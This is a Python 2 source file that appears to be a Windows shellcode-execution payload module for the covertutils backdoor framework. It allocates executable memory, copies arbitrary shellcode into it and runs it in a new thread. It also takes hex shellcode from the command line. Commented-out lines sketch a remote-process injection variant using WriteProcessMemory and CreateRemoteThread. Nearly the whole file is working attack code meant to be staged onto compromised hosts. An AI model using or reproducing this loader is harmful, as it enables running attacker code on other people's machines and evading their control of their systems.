

def init(storage) :

	import ctypes
	import ctypes.wintypes as wintypes

	class __PROCESS_INFORMATION(ctypes.Structure):
	    """see:
	http://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
	"""
	    _fields_ = [("hProcess",    wintypes.HANDLE),
	                ("hThread",     wintypes.HANDLE),
	                ("dwProcessId", wintypes.DWORD),
	                ("dwThreadId",  wintypes.DWORD),]
	wintypes.PROCESS_INFORMATION = __PROCESS_INFORMATION

	pid = wintypes.PROCESS_INFORMATION().dwProcessId
	PROCESS_ALL_ACCESS = (0x000F0000L|0x00100000L|0xFFF)
	handle = ctypes.windll.kernel32.OpenProcess(
	                                    PROCESS_ALL_ACCESS,
	                                    False,
	                                    pid
										)
	storage['process_pid'] = pid
	storage['process_handle'] = handle
	ModuleHandle = ctypes.windll.kernel32.GetModuleHandleA("kernel32.dll")
	LoadLibraryA = ctypes.windll.kernel32.GetProcAddress(
	                            wintypes.HANDLE(ModuleHandle),
								"LoadLibraryA",
								)
	storage['LoadLibraryA'] = LoadLibraryA
	return True


def work( storage, message ) :

	shellcode = message
	import ctypes
	# import ctypes.wintypes as wintypes

	# def get_last_error(desc, val):
	#         # return # Comment out the return to see return and error values
	#         print "%s=0x%x, GetCurrentError=0x%x (%d)" % (desc, val, ctypes.windll.kernel32.GetLastError(), ctypes.windll.kernel32.GetLastError())


	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
	                                          ctypes.c_int(len( shellcode )),
	                                          ctypes.c_int(0x1000),
	                                        #   ctypes.c_int(0x3000),
	                                          ctypes.c_int(0x40))

	shellcodeaddress = ptr

	buf = (ctypes.c_char * len(shellcode)).from_buffer(bytearray(shellcode))

	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
	                                     buf,
	                                     ctypes.c_int(len(shellcode)))

	# get_last_error("WriteProcessMemory", result);
	#
	# result = ctypes.windll.kernel32.WriteProcessMemory(
	#                                 storage['process_handle'],
	#                                 shellcodeaddress,
	#                                 shellcode,
	#                                 len(shellcode),
	#                                 None,
	# 								)

	# get_last_error("WriteProcessMemory", result);

	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
	                                         ctypes.c_int(0),
	                                         ctypes.c_int(ptr),
	                                         ctypes.c_int(0),
	                                         ctypes.c_int(0),
	                                         ctypes.pointer(ctypes.c_int(0)))

	# ht = ctypes.windll.kernel32.CreateRemoteThread(
	# 										 storage['process_handle'],
	# 										 ctypes.c_int(0),
	#                                          ctypes.c_int(0),
	#                                          shellcodeaddress,
	#                                          ctypes.c_int(0),
	#                                          ctypes.c_int(0),
	#                                          ctypes.pointer(ctypes.c_int(0)),
	# 										 )
	# get_last_error("CreateRemoteThread", remote_thread);
	# print remote_thread
	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
	print "A"


if '__main__' == __name__ :

	import sys

	shellhex = sys.argv[1]

	store = {}
	init(store)
	work(store, shellhex.decode('hex'))

	sys.exit()

from covertutils.shells.subshells import ShellcodeSubShell as shell


# !stage mload covertutils.payloads.windows.shellcode
